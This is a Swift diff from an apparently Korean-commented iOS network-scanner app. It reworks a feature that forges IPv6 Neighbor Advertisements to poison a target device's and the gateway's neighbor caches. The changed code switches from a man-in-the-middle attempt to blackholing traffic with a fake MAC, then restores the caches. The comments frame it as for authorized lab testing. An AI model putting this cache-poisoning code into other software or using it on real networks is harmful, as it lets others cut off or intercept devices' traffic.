@@ -65,7 +65,8 @@ final class ScanViewModel {
     @ObservationIgnored private let dhcpSniffer: any DHCPSniffing
     @ObservationIgnored private let vendorLookup: (MACAddress) -> String?
     @ObservationIgnored private let wakeSender = MagicPacketSender()
-    /// (인가된 실험 전용) IPv6 이웃 광고(NA)를 위조해 이웃 캐시에 독을 묻힌다 — NeighborProber와 같은 ICMPv6 소켓
+    /// (인가된 실험 전용) IPv6 이웃 광고(NA)를 위조해 이웃 캐시를 교란(블랙홀) 시도 + 송신 가능 여부 측정.
+    /// 스톡 iOS 커널은 비루트 앱에 NA 송신을 안 허용(EPERM) — 랩의 루트 맥·리눅스에서만 나간다.
     @ObservationIgnored private let neighborSpoofer = NDPSpoofer(advertiser: SystemNeighborAdvertiser())
     /// 앱이 백그라운드로 간 뒤 진행 중인 스캔을 마무리하는 시간(약 30초)
     @ObservationIgnored private var backgroundTask: UIBackgroundTaskIdentifier = .invalid
@@ -167,44 +168,46 @@ final class ScanViewModel {
         return await wakeSender.wake(mac: mac, lastKnownIP: device.address, broadcast: scannedNetwork?.subnet.broadcast)
     }
 
-    /// NDP 스푸핑 한 판의 결과(상세 화면에 한 줄로 보여 준다).
+    /// NDP 이웃 캐시 교란 한 판의 결과(상세 화면에 한 줄로 보여 준다).
     enum NeighborSpoofResult: Equatable {
         case sent(Int)
         case blocked
         case noNetwork
         case noVictimIPv6
         case noGatewayIPv6
-        case noOwnMAC
 
         var message: String {
             switch self {
             case .sent(let n):
-                return "NDP 스푸핑: 위조 이웃 광고 \(n)통을 보냈어요. 상대 이웃 캐시가 바뀌었는지 다시 스캔해 확인하세요(끝나고 캐시는 원복했어요)."
+                return "NDP 교란(실험): 위조 이웃 광고 \(n)통이 커널을 빠져나갔어요. 상대·게이트웨이 이웃 캐시가 테스트용 가짜 MAC으로 바뀌었는지 피해자 쪽에서 확인하세요(예: ip -6 neigh). 끝나고 진짜 MAC으로 원복을 보냈어요."
             case .blocked:
-                return "NDP 스푸핑: iOS가 ICMPv6 송신을 막았어요 — 이 기기에선 불가(랩의 맥·리눅스에선 됩니다)."
+                return "NDP 교란(실험): iOS가 이웃 광고(ICMPv6 136) 송신을 막았어요. 스톡 iOS 커널은 비루트 앱에 echo·NI 쿼리만 허용해서(EPERM) 이 기기에선 불가예요 — 랩의 루트 맥·리눅스에서만 나갑니다."
             case .noNetwork:
-                return "NDP 스푸핑: 먼저 스캔하세요."
+                return "NDP 교란(실험): 먼저 스캔하세요."
             case .noVictimIPv6:
-                return "NDP 스푸핑: 이 기기의 링크로컬 IPv6(fe80::…)를 아직 몰라요 — 먼저 스캔해 이웃을 찾으세요."
+                return "NDP 교란(실험): 이 기기의 링크로컬 IPv6(fe80::…)를 아직 몰라요 — 먼저 스캔해 이웃을 찾으세요."
             case .noGatewayIPv6:
-                return "NDP 스푸핑: 게이트웨이의 링크로컬 IPv6를 아직 몰라요."
-            case .noOwnMAC:
-                return "NDP 스푸핑: iOS가 내 Wi-Fi MAC을 가려(02:…) 위조에 쓸 수 없어요 — 이 기기에선 불가."
+                return "NDP 교란(실험): 게이트웨이의 링크로컬 IPv6를 아직 몰라요 — 먼저 스캔하세요."
             }
         }
     }
 
-    /// (인가된 테스트 전용) IPv6 이웃 광고(NA)를 위조해 `device`의 이웃 캐시에 "게이트웨이는 내 MAC"을,
-    /// 게이트웨이에는 "이 기기는 내 MAC"을 심어 중간자를 시도한다(`NDPSpoof.mitm`). 몇 초 보낸 뒤 진짜 MAC으로 원복한다.
-    /// iOS가 ICMPv6 송신·자기 MAC을 막는지는 실제로 측정해 결과로 돌려준다(ARP 스푸핑의 IPv6 사촌).
+    /// (인가된 테스트 전용) IPv6 이웃 광고(NA)를 위조해 `device`와 게이트웨이의 이웃 캐시를 가짜 MAC으로 덮어
+    /// 둘 사이 IPv6 연결을 교란(블랙홀)한다(`NDPSpoof.mitm`). 실제로 송신을 시도해 나갔는지/막혔는지 측정한다.
+    ///
+    /// 스톡 iOS는 커널이 비루트 앱의 ICMPv6 송신을 echo·NI 쿼리로 제한해(XNU icmp6_dgram_send) NA(136)
+    /// 송신이 EPERM으로 막힌다 — 실기기에선 .blocked로 측정될 것이다(랩의 루트 맥·리눅스에선 나간다).
+    /// iOS는 자기 Wi-Fi MAC도 가리므로, 교란용 가짜 MAC(LAN에 없는 로컬관리 주소)을 쓴다(공격자 실제 MAC 불요).
     func spoofNeighbor(_ device: Device, for duration: Duration = .seconds(6)) async -> NeighborSpoofResult {
         guard let network = scannedNetwork else { return .noNetwork }
         guard let victim6 = device.ipv6Addresses.first(where: \.isLinkLocal) else { return .noVictimIPv6 }
         guard let gatewayDevice = devices[network.gateway.address],
               let gateway6 = gatewayDevice.ipv6Addresses.first(where: \.isLinkLocal) else { return .noGatewayIPv6 }
-        guard let myMAC = Interfaces.linkLayerAddress(of: network.interfaceName ?? "en0") else { return .noOwnMAC }
 
-        let targets = NDPSpoof.mitm(victim: victim6, gateway: gateway6, attackerMAC: myMAC)
+        // 내 MAC을 읽히면 쓰고, iOS가 가리면 LAN에 없는 로컬관리 가짜 MAC으로 캐시를 블랙홀시킨다(내 실제 MAC 불요)
+        let poisonMAC = Interfaces.linkLayerAddress(of: network.interfaceName ?? "en0")
+            ?? MACAddress([0x02, 0x00, 0xDE, 0xAD, 0xBE, 0xEF])!
+        let targets = NDPSpoof.mitm(victim: victim6, gateway: gateway6, attackerMAC: poisonMAC)
         let run = await neighborSpoofer.poison(targets, on: network.interfaceName, every: .seconds(2), for: duration)
 
         // 뒷정리: 아는 진짜 MAC으로 양쪽 캐시를 원복한다(impersonatedIP별로 매핑)
